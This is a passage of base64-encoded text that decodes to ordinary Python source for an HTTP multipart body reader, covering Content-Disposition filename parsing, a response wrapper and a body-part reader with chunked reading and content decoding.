A7IGluIGZpbGVuYW1lLCBpbiBhbnkgY2FzZSB0aGlzIGlzIGp1c3RcclxuICAgICAgICAgICAgICAgICMgb25lIGNhc2UgZml4LCBmb3IgcHJvcGVyIGZpeCB3ZSBuZWVkIHRvIHJlZGVzaWduIHBhcnNlclxyXG4gICAgICAgICAgICAgICAgX3ZhbHVlID0gZiJ7dmFsdWV9O3twYXJ0c1swXX0iXHJcbiAgICAgICAgICAgICAgICBpZiBpc19xdW90ZWQoX3ZhbHVlKTpcclxuICAgICAgICAgICAgICAgICAgICBwYXJ0cy5wb3AoMClcclxuICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHVuZXNjYXBlKF92YWx1ZVsxOi0xXS5sc3RyaXAoIlxcXFwvIikpXHJcbiAgICAgICAgICAgICAgICAgICAgZmFpbGVkID0gRmFsc2VcclxuXHJcbiAgICAgICAgICAgIGlmIGZhaWxlZDpcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oQmFkQ29udGVudERpc3Bvc2l0aW9uSGVhZGVyKGhlYWRlcikpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZSwge31cclxuXHJcbiAgICAgICAgcGFyYW1zW2tleV0gPSB2YWx1ZVxyXG5cclxuICAgIHJldHVybiBkaXNwdHlwZS5sb3dlcigpLCBwYXJhbXNcclxuXHJcblxyXG5kZWYgY29udGVudF9kaXNwb3NpdGlvbl9maWxlbmFtZShcclxuICAgIHBhcmFtczogTWFwcGluZ1tzdHIsIHN0cl0sIG5hbWU6IHN0ciA9ICJmaWxlbmFtZSJcclxuKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgbmFtZV9zdWYgPSAiJXMqIiAlIG5hbWVcclxuICAgIGlmIG5vdCBwYXJhbXM6XHJcbiAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgIGVsaWYgbmFtZV9zdWYgaW4gcGFyYW1zOlxyXG4gICAgICAgIHJldHVybiBwYXJhbXNbbmFtZV9zdWZdXHJcbiAgICBlbGlmIG5hbWUgaW4gcGFyYW1zOlxyXG4gICAgICAgIHJldHVybiBwYXJhbXNbbmFtZV1cclxuICAgIGVsc2U6XHJcbiAgICAgICAgcGFydHMgPSBbXVxyXG4gICAgICAgIGZucGFyYW1zID0gc29ydGVkKFxyXG4gICAgICAgICAgICAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gcGFyYW1zLml0ZW1zKCkgaWYga2V5LnN0YXJ0c3dpdGgobmFtZV9zdWYpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGZvciBudW0sIChrZXksIHZhbHVlKSBpbiBlbnVtZXJhdGUoZm5wYXJhbXMpOlxyXG4gICAgICAgICAgICBfLCB0YWlsID0ga2V5LnNwbGl0KCIqIiwgMSlcclxuICAgICAgICAgICAgaWYgdGFpbC5lbmRzd2l0aCgiKiIpOlxyXG4gICAgICAgICAgICAgICAgdGFpbCA9IHRhaWxbOi0xXVxyXG4gICAgICAgICAgICBpZiB0YWlsID09IHN0cihudW0pOlxyXG4gICAgICAgICAgICAgICAgcGFydHMuYXBwZW5kKHZhbHVlKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICBpZiBub3QgcGFydHM6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgdmFsdWUgPSAiIi5qb2luKHBhcnRzKVxyXG4gICAgICAgIGlmICJcJyIgaW4gdmFsdWU6XHJcbiAgICAgICAgICAgIGVuY29kaW5nLCBfLCB2YWx1ZSA9IHZhbHVlLnNwbGl0KCJcJyIsIDIpXHJcbiAgICAgICAgICAgIGVuY29kaW5nID0gZW5jb2Rpbmcgb3IgInV0Zi04IlxyXG4gICAgICAgICAgICByZXR1cm4gdW5xdW90ZSh2YWx1ZSwgZW5jb2RpbmcsICJzdHJpY3QiKVxyXG4gICAgICAgIHJldHVybiB2YWx1ZVxyXG5cclxuXHJcbmNsYXNzIE11bHRpcGFydFJlc3BvbnNlV3JhcHBlcjpcclxuICAgICIiIldyYXBwZXIgYXJvdW5kIHRoZSBNdWx0aXBhcnRSZWFkZXIuXHJcblxyXG4gICAgSXQgdGFrZXMgY2FyZSBhYm91dFxyXG4gICAgdW5kZXJseWluZyBjb25uZWN0aW9uIGFuZCBjbG9zZSBpdCB3aGVuIGl0IG5lZWRzIGluLlxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcmVzcDogIkNsaWVudFJlc3BvbnNlIixcclxuICAgICAgICBzdHJlYW06ICJNdWx0aXBhcnRSZWFkZXIiLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYucmVzcCA9IHJlc3BcclxuICAgICAgICBzZWxmLnN0cmVhbSA9IHN0cmVhbVxyXG5cclxuICAgIGRlZiBfX2FpdGVyX18oc2VsZikgLT4gIk11bHRpcGFydFJlc3BvbnNlV3JhcHBlciI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IFVuaW9uWyJNdWx0aXBhcnRSZWFkZXIiLCAiQm9keVBhcnRSZWFkZXIiXTpcclxuICAgICAgICBwYXJ0ID0gYXdhaXQgc2VsZi5uZXh0KClcclxuICAgICAgICBpZiBwYXJ0IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFN0b3BBc3luY0l0ZXJhdGlvblxyXG4gICAgICAgIHJldHVybiBwYXJ0XHJcblxyXG4gICAgZGVmIGF0X2VvZihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIlJldHVybnMgVHJ1ZSB3aGVuIGFsbCByZXNwb25zZSBkYXRhIGhhZCBiZWVuIHJlYWQuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYucmVzcC5jb250ZW50LmF0X2VvZigpXHJcblxyXG4gICAgYXN5bmMgZGVmIG5leHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gT3B0aW9uYWxbVW5pb25bIk11bHRpcGFydFJlYWRlciIsICJCb2R5UGFydFJlYWRlciJdXTpcclxuICAgICAgICAiIiJFbWl0cyBuZXh0IG11bHRpcGFydCByZWFkZXIgb2JqZWN0LiIiIlxyXG4gICAgICAgIGl0ZW0gPSBhd2FpdCBzZWxmLnN0cmVhbS5uZXh0KClcclxuICAgICAgICBpZiBzZWxmLnN0cmVhbS5hdF9lb2YoKTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5yZWxlYXNlKClcclxuICAgICAgICByZXR1cm4gaXRlbVxyXG5cclxuICAgIGFzeW5jIGRlZiByZWxlYXNlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiUmVsZWFzZSB0aGUgY29ubmVjdGlvbiBncmFjZWZ1bGx5LlxyXG5cclxuICAgICAgICBBbGwgcmVtYWluaW5nIGNvbnRlbnQgaXMgcmVhZCB0byB0aGUgdm9pZC5cclxuICAgICAgICAiIiJcclxuICAgICAgICBhd2FpdCBzZWxmLnJlc3AucmVsZWFzZSgpXHJcblxyXG5cclxuY2xhc3MgQm9keVBhcnRSZWFkZXI6XHJcbiAgICAiIiJNdWx0aXBhcnQgcmVhZGVyIGZvciBzaW5nbGUgYm9keSBwYXJ0LiIiIlxyXG5cclxuICAgIGNodW5rX3NpemUgPSA4MTkyXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsIGJvdW5kYXJ5OiBieXRlcywgaGVhZGVyczogIkNJTXVsdGlEaWN0UHJveHlbc3RyXSIsIGNvbnRlbnQ6IFN0cmVhbVJlYWRlclxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuaGVhZGVycyA9IGhlYWRlcnNcclxuICAgICAgICBzZWxmLl9ib3VuZGFyeSA9IGJvdW5kYXJ5XHJcbiAgICAgICAgc2VsZi5fY29udGVudCA9IGNvbnRlbnRcclxuICAgICAgICBzZWxmLl9hdF9lb2YgPSBGYWxzZVxyXG4gICAgICAgIGxlbmd0aCA9IHNlbGYuaGVhZGVycy5nZXQoQ09OVEVOVF9MRU5HVEgsIE5vbmUpXHJcbiAgICAgICAgc2VsZi5fbGVuZ3RoID0gaW50KGxlbmd0aCkgaWYgbGVuZ3RoIGlzIG5vdCBOb25lIGVsc2UgTm9uZVxyXG4gICAgICAgIHNlbGYuX3JlYWRfYnl0ZXMgPSAwXHJcbiAgICAgICAgIyBUT0RPOiB0eXBlaW5nLkRlcXVlIGlzIG5vdCBzdXBwb3J0ZWQgYnkgUHl0aG9uIDMuNVxyXG4gICAgICAgIHNlbGYuX3VucmVhZDogRGVxdWVbYnl0ZXNdID0gZGVxdWUoKVxyXG4gICAgICAgIHNlbGYuX3ByZXZfY2h1bmsgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2J5dGVzXVxyXG4gICAgICAgIHNlbGYuX2NvbnRlbnRfZW9mID0gMFxyXG4gICAgICAgIHNlbGYuX2NhY2hlID0ge30gICMgdHlwZTogRGljdFtzdHIsIEFueV1cclxuXHJcbiAgICBkZWYgX19haXRlcl9fKHNlbGYpIC0+IEFzeW5jSXRlcmF0b3JbIkJvZHlQYXJ0UmVhZGVyIl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYgICMgdHlwZTogaWdub3JlW3JldHVybi12YWx1ZV1cclxuXHJcbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHBhcnQgPSBhd2FpdCBzZWxmLm5leHQoKVxyXG4gICAgICAgIGlmIHBhcnQgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXHJcbiAgICAgICAgcmV0dXJuIHBhcnRcclxuXHJcbiAgICBhc3luYyBkZWYgbmV4dChzZWxmKSAtPiBPcHRpb25hbFtieXRlc106XHJcbiAgICAgICAgaXRlbSA9IGF3YWl0IHNlbGYucmVhZCgpXHJcbiAgICAgICAgaWYgbm90IGl0ZW06XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgcmV0dXJuIGl0ZW1cclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZChzZWxmLCAqLCBkZWNvZGU6IGJvb2wgPSBGYWxzZSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiUmVhZHMgYm9keSBwYXJ0IGRhdGEuXHJcblxyXG4gICAgICAgIGRlY29kZTogRGVjb2RlcyBkYXRhIGZvbGxvd2luZyBieSBlbmNvZGluZ1xyXG4gICAgICAgICAgICAgICAgbWV0aG9kIGZyb20gQ29udGVudC1FbmNvZGluZyBoZWFkZXIuIElmIGl0IG1pc3NlZFxyXG4gICAgICAgICAgICAgICAgZGF0YSByZW1haW5zIHVudG91Y2hlZFxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIHNlbGYuX2F0X2VvZjpcclxuICAgICAgICAgICAgcmV0dXJuIGIiIlxyXG4gICAgICAgIGRhdGEgPSBieXRlYXJyYXkoKVxyXG4gICAgICAgIHdoaWxlIG5vdCBzZWxmLl9hdF9lb2Y6XHJcbiAgICAgICAgICAgIGRhdGEuZXh0ZW5kKGF3YWl0IHNlbGYucmVhZF9jaHVuayhzZWxmLmNodW5rX3NpemUpKVxyXG4gICAgICAgIGlmIGRlY29kZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuZGVjb2RlKGRhdGEpXHJcbiAgICAgICAgcmV0dXJuIGRhdGFcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZF9jaHVuayhzZWxmLCBzaXplOiBpbnQgPSBjaHVua19zaXplKSAtPiBieXRlczpcclxuICAgICAgICAiIiJSZWFkcyBib2R5IHBhcnQgY29udGVudCBjaHVuayBvZiB0aGUgc3BlY2lmaWVkIHNpemUuXHJcblxyXG4gICAgICAgIHNpemU6IGNodW5rIHNpemVcclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBzZWxmLl9hdF9lb2Y6XHJcbiAgICAgICAgICAgIHJldHVybiBiIiJcclxuICAgICAgICBpZiBzZWxmLl9sZW5ndGg6XHJcbiAgICAgICAgICAgIGNodW5rID0gYXdhaXQgc2VsZi5fcmVhZF9jaHVua19mcm9tX2xlbmd0aChzaXplKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGNodW5rID0gYXdhaXQgc2VsZi5fcmVhZF9jaHVua19mcm9tX3N0cmVhbShzaXplKVxyXG5cclxuICAgICAgICBzZWxmLl9yZWFkX2J5dGVzICs9IGxlbihjaHVuaylcclxuICAgICAgICBpZiBzZWxmLl9yZWFkX2J5dGVzID09IHNlbGYuX2xlbmd0aDpcclxuICAgICAgICAgICAgc2VsZi5fYXRfZW9mID0gVHJ1ZVxyXG4gICAgICAgIGlmIHNlbGYuX2F0X2VvZjpcclxuICAgICAgICAgICAgY2xyZiA9IGF3YWl0IHNlbGYuX2NvbnRlbnQucmVhZGxpbmUoKVxyXG4gICAgICAgICAgICBhc3NlcnQgKFxyXG4gICAgICAgICAgICAgICAgYiJcXHJcXG4iID09IGNscmZcclxuICAgICAgICAgICAgKSwgInJlYWRlciBkaWQgbm90IHJlYWQgYWxsIHRoZSBkYXRhIG9yIGl0IGlzIG1hbGZvcm1lZCJcclxuICAgICAgICByZXR1cm4gY2h1bmtcclxuXHJcbiAgICBhc3luYyBkZWYgX3JlYWRfY2h1bmtfZnJvbV9sZW5ndGgoc2VsZiwgc2l6ZTogaW50KSAtPiBieXRlczpcclxuICAgICAgICAjIFJlYWRzIGJvZHkgcGFydCBjb250ZW50IGNodW5rIG9mIHRoZSBzcGVjaWZpZWQgc2l6ZS5cclxuICAgICAgICAjIFRoZSBib2R5IHBhcnQgbXVzdCBoYXMgQ29udGVudC1MZW5ndGggaGVhZGVyIHdpdGggcHJvcGVyIHZhbHVlLlxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9sZW5ndGggaXMgbm90IE5vbmUsICJDb250ZW50LUxlbmd0aCByZXF1aXJlZCBmb3IgY2h1bmtlZCByZWFkIlxyXG4gICAgICAgIGNodW5rX3NpemUgPSBtaW4oc2l6ZSwgc2VsZi5fbGVuZ3RoIC0gc2VsZi5fcmVhZF9ieXRlcylcclxuICAgICAgICBjaHVuayA9IGF3YWl0IHNlbGYuX2NvbnRlbnQucmVhZChjaHVua19zaXplKVxyXG4gICAgICAgIHJldHVybiBjaHVua1xyXG5cclxuICAgIGFzeW5jIGRlZiBfcmVhZF9jaHVua19mcm9tX3N0cmVhbShzZWxmLCBzaXplOiBpbnQpIC0+IGJ5dGVzOlxyXG4gICAgICAgICMgUmVhZHMgY29udGVudCBjaHVuayBvZiBib2R5IHBhcnQgd2l0aCB1bmtub3duIGxlbmd0aC5cclxuICAgICAgICAjIFRoZSBDb250ZW50LUxlbmd0aCBoZWFkZXIgZm9yIGJvZHkgcGFydCBpcyBub3QgbmVjZXNzYXJ5LlxyXG4gICAgICAgIGFzc2VydCAoXHJcbiAgICAgICAgICAgIHNpemUgPj0gbGVuKHNlbGYuX2JvdW5kYXJ5KSArIDJcclxuICAgICAgICApLCAiQ2h1bmsgc2l6ZSBtdXN0IGJlIGdyZWF0ZXIgb3IgZXF1YWwgdGhhbiBib3VuZGFyeSBsZW5ndGggKyAyIlxyXG4gICAgICAgIGZpcnN0X2NodW5rID0gc2VsZi5fcHJldl9jaHVuayBpcyBOb25lXHJcbiAgICAgICAgaWYgZmlyc3RfY2h1bms6XHJcbiAgICAgICAgICAgIHNlbGYuX3ByZXZfY2h1bmsgPSBhd2FpdCBzZWxmLl9jb250ZW50LnJlYWQoc2l6ZSlcclxuXHJcbiAgICAgICAgY2h1bmsgPSBhd2FpdCBzZWxmLl9jb250ZW50LnJlYWQoc2l6ZSlcclxuICAgICAgICBzZWxmLl9jb250ZW50X2VvZiArPSBpbnQoc2VsZi5fY29udGVudC5hdF9lb2YoKSlcclxuICAgICAgICBhc3NlcnQgc2VsZi5fY29udGVudF9lb2YgPCAzLCAiUmVhZGluZyBhZnRlciBFT0YiXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3ByZXZfY2h1bmsgaXMgbm90IE5vbmVcclxuICAgICAgICB3aW5kb3cgPSBzZWxmLl9wcmV2X2NodW5rICsgY2h1bmtcclxuICAgICAgICBzdWIgPSBiIlxcclxcbiIgKyBzZWxmLl9ib3VuZGFyeVxyXG4gICAgICAgIGlmIGZpcnN0X2NodW5rOlxyXG4gICAgICAgICAgICBpZHggPSB3aW5kb3cuZmluZChzdWIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWR4ID0gd2luZG93LmZpbmQoc3ViLCBtYXgoMCwgbGVuKHNlbGYuX3ByZXZfY2h1bmspIC0gbGVuKHN1YikpKVxyXG4gICAgICAgIGlmIGlkeCA+PSAwOlxyXG4gICAgICAgICAgICAjIHB1c2hpbmcgYm91bmRhcnkgYmFjayB0byBjb250ZW50XHJcbiAgICAgICAgICAgIHdpdGggd2FybmluZ3MuY2F0Y2hfd2FybmluZ3MoKTpcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLmZpbHRlcndhcm5pbmdzKCJpZ25vcmUiLCBjYXRlZ29yeT1EZXByZWNhdGlvbldhcm5pbmcpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jb250ZW50LnVucmVhZF9kYXRhKHdpbmRvd1tpZHg6XSlcclxuICAgICAgICAgICAgaWYgc2l6ZSA+IGlkeDpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3ByZXZfY2h1bmsgPSBzZWxmLl9wcmV2X2NodW5rWzppZHhdXHJcbiAgICAgICAgICAgIGNodW5rID0gd2luZG93W2xlbihzZWxmLl9wcmV2X2NodW5rKSA6IGlkeF1cclxuICAgICAgICAgICAgaWYgbm90IGNodW5rOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYXRfZW9mID0gVHJ1ZVxyXG4gICAgICAgIHJlc3VsdCA9IHNlbGYuX3ByZXZfY2h1bmtcclxuICAgICAgICBzZWxmLl9wcmV2X2NodW5rID0gY2h1bmtcclxuICAgICAgICByZXR1cm4gcmVzdWx0XHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWRsaW5lKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlJlYWRzIGJvZHkgcGFydCBieSBsaW5lIGJ5IGxpbmUuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fYXRfZW9mOlxyXG4gICAgICAgICAgICByZXR1cm4gYiIiXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3VucmVhZDpcclxuICAgICAgICAgICAgbGluZSA9IHNlbGYuX3VucmVhZC5wb3BsZWZ0KClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsaW5lID0gYXdhaXQgc2VsZi5fY29udGVudC5yZWFkbGluZSgpXHJcblxyXG4gICAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aChzZWxmLl9ib3VuZGFyeSk6XHJcbiAgICAgICAgICAgICMgdGhlIHZlcnkgbGFzdCBib3VuZGFyeSBtYXkgbm90IGNvbWUgd2l0aCBcXHJcXG4sXHJcbiAgICAgICAgICAgICMgc28gc2V0IHNpbmdsZSBydWxlcyBmb3IgZXZlcnlvbmVcclxuICAgICAgICAgICAgc2xpbmUgPSBsaW5lLnJzdHJpcChiIlxcclxcbiIpXHJcbiAgICAgICAgICAgIGJvdW5kYXJ5ID0gc2VsZi5fYm91bmRhcnlcclxuICAgICAgICAgICAgbGFzdF9ib3VuZGFyeSA9IHNlbGYuX2JvdW5kYXJ5ICsgYiItLSJcclxuICAgICAgICAgICAgIyBlbnN1cmUgdGhhdCB3ZSByZWFkIGV4YWN0bHkgdGhlIGJvdW5kYXJ5LCBub3Qgc29tZXRoaW5nIGFsaWtlXHJcbiAgICAgICAgICAgIGlmIHNsaW5lID09IGJvdW5kYXJ5IG9yIHNsaW5lID09IGxhc3RfYm91bmRhcnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9hdF9lb2YgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBzZWxmLl91bnJlYWQuYXBwZW5kKGxpbmUpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYiIiXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbmV4dF9saW5lID0gYXdhaXQgc2VsZi5fY29udGVudC5yZWFkbGluZSgpXHJcbiAgICAgICAgICAgIGlmIG5leHRfbGluZS5zdGFydHN3aXRoKHNlbGYuX2JvdW5kYXJ5KTpcclxuICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lWzotMl0gICMgc3RyaXAgQ1JMRiBidXQgb25seSBvbmNlXHJcbiAgICAgICAgICAgIHNlbGYuX3VucmVhZC5hcHBlbmQobmV4dF9saW5lKVxyXG5cclxuICAgICAgICByZXR1cm4gbGluZVxyXG5cclxuICAgIGFzeW5jIGRlZiByZWxlYXNlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiTGlrZSByZWFkKCksIGJ1dCByZWFkcyBhbGwgdGhlIGRhdGEgdG8gdGhlIHZvaWQuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fYXRfZW9mOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICB3aGlsZSBub3Qgc2VsZi5fYXRfZW9mOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLnJlYWRfY2h1bmsoc2VsZi5jaHVua19zaXplKVxyXG5cclxuICAgIGFzeW5jIGRlZiB0ZXh0KHNlbGYsICosIGVuY29kaW5nOiBPcHRpb25hbFtzdHJdID0gTm9uZSkgLT4gc3RyOlxyXG4gICAgICAgICIiIkxpa2UgcmVhZCgpLCBidXQgYXNzdW1lcyB0aGF0IGJvZHkgcGFydCBjb250YWlucyB0ZXh0IGRhdGEuIiIiXHJcbiAgICAgICAgZGF0YSA9IGF3YWl0IHNlbGYucmVhZChkZWNvZGU9VHJ1ZSlcclxuICAgICAgICAjIHNlZSBodHRwczovL3d3dy53My5vcmcvVFIvaHRtbDUvZm9ybXMuaHRtbCNtdWx0aXBhcnQvZm9ybS1kYXRhLWVuY29kaW5nLWFsZ29yaXRobSAjIE5PUUFcclxuICAgICAgICAjIGFuZCBodHRwczovL2R2Y3MudzMub3JnL2hnL3hoci9yYXctZmlsZS90aXAvT3ZlcnZpZXcuaHRtbCNkb20teG1saHR0cHJlcXVlc3Qtc2VuZCAjIE5PUUFcclxuICAgICAgICBlbmNvZGluZyA9IGVuY29kaW5nIG9yIHNlbGYuZ2V0X2NoYXJzZXQoZGVmYXVsdD0idXRmLTgiKVxyXG4gICAgICAgIHJldHVybiBkYXRhLmRlY29kZShlbmNvZGluZylcclxuXHJcbiAgICBhc3luYyBkZWYganNvbihzZWxmLCAqLCBlbmNvZGluZzogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE9wdGlvbmFsW0RpY3Rbc3RyLCBBbnldXTpcclxuICAgICAgICAiIiJMaWtlIHJlYWQoKSwgYnV0IGFzc3VtZXMgdGhhdCBib2R5IHBhcnRzIGNvbnRhaW5zIEpTT04gZGF0YS4iIiJcclxuICAgICAgICBkYXRhID0gYXdhaXQgc2VsZi5yZWFkKGRlY29kZT1UcnVlKVxyXG4gICAgICAgIGlmIG5vdCBkYXRhOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIGVuY29kaW5nID0gZW5jb2Rpbmcgb3Igc2VsZi5nZXRfY2hhcnNldChkZWZhdWx0PSJ1dGYtOCIpXHJcbiAgICAgICAgcmV0dXJuIGNhc3QoRGljdFtzdHIsIEFueV0sIGpzb24ubG9hZHMoZGF0YS5kZWNvZGUoZW5jb2RpbmcpKSlcclxuXHJcbiAgICBhc3luYyBkZWYgZm9ybShzZWxmLCAqLCBlbmNvZGluZzogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IExpc3RbVHVwbGVbc3RyLCBzdHJdXTpcclxuICAgICAgICAiIiJMaWtlIHJlYWQoKSwgYnV0IGFzc3VtZXMgdGhhdCBib2R5IHBhcnRzIGNvbnRhaW4gZm9ybSB1cmxlbmNvZGVkIGRhdGEuIiIiXHJcbiAgICAgICAgZGF0YSA9IGF3YWl0IHNlbGYucmVhZChkZWNvZGU9VHJ1ZSlcclxuICAgICAgICBpZiBub3QgZGF0YTpcclxuICAgICAgICAgICAgcmV0dXJuIFtdXHJcbiAgICAgICAgaWYgZW5jb2RpbmcgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJlYWxfZW5jb2RpbmcgPSBlbmNvZGluZ1xyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJlYWxfZW5jb2RpbmcgPSBzZWxmLmdldF9jaGFyc2V0KGRlZmF1bHQ9InV0Zi04IilcclxuICAgICAgICByZXR1cm4gcGFyc2VfcXNsKFxyXG4gICAgICAgICAgICBkYXRhLnJzdHJpcCgpLmRlY29kZShyZWFsX2VuY29kaW5nKSxcclxuICAgICAgICAgICAga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSxcclxuICAgICAgICAgICAgZW5jb2Rpbmc9cmVhbF9lbmNvZGluZyxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGF0X2VvZihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIlJldHVybnMgVHJ1ZSBpZiB0aGUgYm91bmRhcnkgd2FzIHJlYWNoZWQgb3IgRmFsc2Ugb3RoZXJ3aXNlLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hdF9lb2ZcclxuXHJcbiAgICBkZWYgZGVjb2RlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICAiIiJEZWNvZGVzIGRhdGEuXHJcblxyXG4gICAgICAgIERlY29kaW5nIGlzIGRvbmUgYWNjb3JkaW5nIHRoZSBzcGVjaWZpZWQgQ29udGVudC1FbmNvZGluZ1xyXG4gICAgICAgIG9yIENvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcgaGVhZGVycyB2YWx1ZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBDT05URU5UX1RSQU5TRkVSX0VOQ09ESU5HIGluIHNlbGYuaGVhZGVyczpcclxuICAgICAgICAgICAgZGF0YSA9IHNlbGYuX2RlY29kZV9jb250ZW50X3RyYW5zZmVyKGRhdGEpXHJcbiAgICAgICAgaWYgQ09OVEVOVF9FTkNPRElORyBpbiBzZWxmLmhlYWRlcnM6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9kZWNvZGVfY29udGVudChkYXRhKVxyXG4gICAgICAgIHJldHVybiBkYXRhXHJcblxyXG4gICAgZGVmIF9kZWNvZGVfY29udGVudChzZWxmLCBkYXRhOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgZW5jb2RpbmcgPSBzZWxmLmhlYWRlcnMuZ2V0KENPTlRFTlRfRU5DT0RJTkcsICIiKS5sb3dlcigpXHJcblxyXG4gICAgICAgIGlmIGVuY29kaW5nID09ICJkZWZsYXRlIjpcclxuICAgICAgICAgICAgcmV0dXJuIHpsaWIuZGVjb21wcmVzcyhkYXRhLCAtemxpYi5NQVhfV0JJVFMpXHJcbiAgICAgICAgZWxpZiBlbmNvZGluZyA9PSAiZ3ppcCI6XHJcbiAgICAgICAgICAgIHJldHVybiB6bGliLmRlY29tcHJlc3MoZGF0YSwgMTYgKyB6bGliLk1BWF9XQklUUylcclxuICAgICAgICBlbGlmIGVuY29kaW5nID09ICJpZGVudGl0eSI6XHJcbiAgICAgICAgICAgIHJldHVybiBkYXRhXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKGYidW5rbm93biBjb250ZW50IGVuY29kaW5nOiB7ZW5jb2Rpbmd9IilcclxuXHJcbiAgICBkZWYgX2RlY29kZV9jb250ZW50X3RyYW5zZmVyKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICBlbmNvZGluZyA9IHNlbGYuaGVhZGVycy5nZXQoQ09OVEVOVF9UUkFOU0ZFUl9FTkNPRElORywgIiIpLmxvd2VyKClcclxuXHJcbiAgICAgICAgaWYgZW5jb2RpbmcgPT0gImJhc2U2NCI6XHJcbiAgICAgICAgICAgIHJldHVybiBiYXNlNjQuYjY0ZGVjb2RlKGRhdGEpXHJcbiAgICAgICAgZWxpZiBlbmNvZGluZyA9PSAicXVvdGVkLXByaW50YWJsZSI6XHJcbiAgICAgICAgICAgIHJldHVybiBiaW5hc2NpaS5hMmJfcXAoZGF0YSlcclxuICAgICAgICBlbGlmIGVuY29kaW5nIGluICgiYmluYXJ5IiwgIjhiaXQiLCAiN2JpdCIpOlxyXG4gICAgICAgICAgICByZXR1cm4gZGF0YVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ1bmtub3duIGNvbnRlbnQgdHJhbnNmZXIgZW5jb2Rpbmc6IHt9IiAiIi5mb3JtYXQoZW5jb2RpbmcpXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgZ2V0X2NoYXJzZXQoc2VsZiwgZGVmYXVsdDogc3RyKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiUmV0dXJucyBjaGFyc2V0IHBhcmFtZXRlciBmcm9tIENvbnRlbnQtVHlwZSBoZWFkZ